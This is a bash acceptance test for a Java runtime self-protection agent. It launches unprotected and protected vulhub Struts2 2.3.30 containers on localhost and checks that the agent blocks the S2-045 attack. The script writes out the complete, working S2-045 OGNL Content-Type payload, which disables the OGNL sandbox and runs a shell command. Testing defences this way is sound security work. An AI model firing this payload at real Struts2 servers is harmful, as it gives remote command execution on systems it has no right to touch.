#!/usr/bin/env bash
set -euo pipefail

cd "$(dirname "$0")/.."

image="${OHMYRASP_VULHUB_STRUTS2_S2045_IMAGE:-vulhub/struts2:2.3.30}"
baseline_name="${OHMYRASP_VULHUB_STRUTS2_S2045_BASELINE_NAME:-ohmyrasp-vulhub-struts2-s2045-baseline}"
protected_name="${OHMYRASP_VULHUB_STRUTS2_S2045_PROTECTED_NAME:-ohmyrasp-vulhub-struts2-s2045-protected}"
baseline_port="${OHMYRASP_VULHUB_STRUTS2_S2045_BASELINE_PORT:-18530}"
protected_port="${OHMYRASP_VULHUB_STRUTS2_S2045_PROTECTED_PORT:-18531}"
host_agent_jar="$(pwd)/agent-java8/build/libs/ohmyrasp-agent-java8.jar"
baseline_dir="logs/vulhub-struts2-s2-045-java8-baseline"
protected_dir="logs/vulhub-struts2-s2-045-java8-protected"
protected_log="${protected_dir}/events.jsonl"

docker run --rm -v "$(pwd):/workspace" -w /workspace gradle:jdk25 \
  gradle --no-daemon :agent-java8:agentJava8Jar

rm -rf "$baseline_dir" "$protected_dir"
mkdir -p "$baseline_dir" "$protected_dir"
: > "$protected_log"
chmod 666 "$protected_log"

cleanup() {
  docker logs "$baseline_name" > "${baseline_dir}/container.log" 2>&1 || true
  docker logs "$protected_name" > "${protected_dir}/container.log" 2>&1 || true
  docker rm -f "$baseline_name" "$protected_name" >/dev/null 2>&1 || true
}
trap cleanup EXIT

docker rm -f "$baseline_name" "$protected_name" >/dev/null 2>&1 || true

docker run -d --name "$baseline_name" -p "${baseline_port}:8080" \
  "$image" >/dev/null

docker run -d --name "$protected_name" -p "${protected_port}:8080" \
  -v "${host_agent_jar}:/opt/ohmyrasp/ohmyrasp-agent-java8.jar:ro" \
  -v "$(pwd)/${protected_dir}:/opt/ohmyrasp/logs" \
  -e JAVA_TOOL_OPTIONS="-javaagent:/opt/ohmyrasp/ohmyrasp-agent-java8.jar -Dohmyrasp.java8.log=/opt/ohmyrasp/logs/events.jsonl -Dohmyrasp.java8.block=true" \
  "$image" >/dev/null

wait_for() {
  local name="$1"
  local port="$2"
  local status
  for _ in $(seq 1 180); do
    status="$(curl -sS -o "/tmp/${name}.html" -w "%{http_code}" \
      "http://127.0.0.1:${port}/" || true)"
    if [[ "$status" == "200" ]]; then
      return
    fi
    sleep 1
  done
  echo "${name} did not expose Struts2 root at ${port}" >&2
  exit 1
}

write_payload() {
  local output="$1"
  python3 - "$output" <<'PY'
import sys

payload = r"""%{(#nike='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='id').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/sh','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds).redirectErrorStream(true).start()).(#ros=@org.apache.struts2.ServletActionContext@getResponse().getOutputStream()).(@org.apache.commons.io.IOUtils@copy(#p.getInputStream(),#ros)).(#ros.flush())}"""
with open(sys.argv[1], "w", encoding="utf-8") as handle:
    handle.write(payload)
PY
}

run_attack() {
  local port="$1"
  local dir="$2"
  local content_type
  content_type="$(cat "${dir}/content-type.txt")"
  curl -sS -i -o "${dir}/attack.response" -w "%{http_code}" \
    -X POST \
    -H "Content-Type: ${content_type}" \
    --data-binary '' \
    "http://127.0.0.1:${port}/" || true
}

wait_for "$baseline_name" "$baseline_port"
wait_for "$protected_name" "$protected_port"

if ! grep -q '"event":"ohmyrasp-java8-agent-start"' "$protected_log"; then
  cat "$protected_log" >&2 || true
  echo "missing Java 8 startup event in Struts2 S2-045 protected container" >&2
  exit 1
fi
if grep -q '"event":"ohmyrasp-detection"' "$protected_log"; then
  cat "$protected_log" >&2
  echo "Struts2 S2-045 protected startup/readiness produced a detection before the exploit request" >&2
  exit 1
fi

write_payload "${baseline_dir}/content-type.txt"
cp "${baseline_dir}/content-type.txt" "${protected_dir}/content-type.txt"

baseline_status="$(run_attack "$baseline_port" "$baseline_dir")"
if [[ ! "$baseline_status" =~ ^(200|500)$ ]] || ! grep -q 'uid=' "${baseline_dir}/attack.response"; then
  sed -n '1,160p' "${baseline_dir}/attack.response" >&2 || true
  echo "baseline Struts2 S2-045 OGNL did not return id output; status=${baseline_status}" >&2
  exit 1
fi

protected_status="$(run_attack "$protected_port" "$protected_dir")"
if grep -q 'uid=' "${protected_dir}/attack.response"; then
  sed -n '1,200p' "${protected_dir}/attack.response" >&2 || true
  echo "protected Struts2 S2-045 OGNL returned command output despite Java8 RASP; status=${protected_status}" >&2
  exit 1
fi
if ! grep -q '"algorithm":"java8_command_execution_exploit_primitive".*"action":"block"' "$protected_log"; then
  cat "$protected_log" >&2
  echo "missing java8_command_execution_exploit_primitive block event for Struts2 S2-045" >&2
  exit 1
fi

echo "vulhub Struts2 S2-045 Java8 acceptance passed"
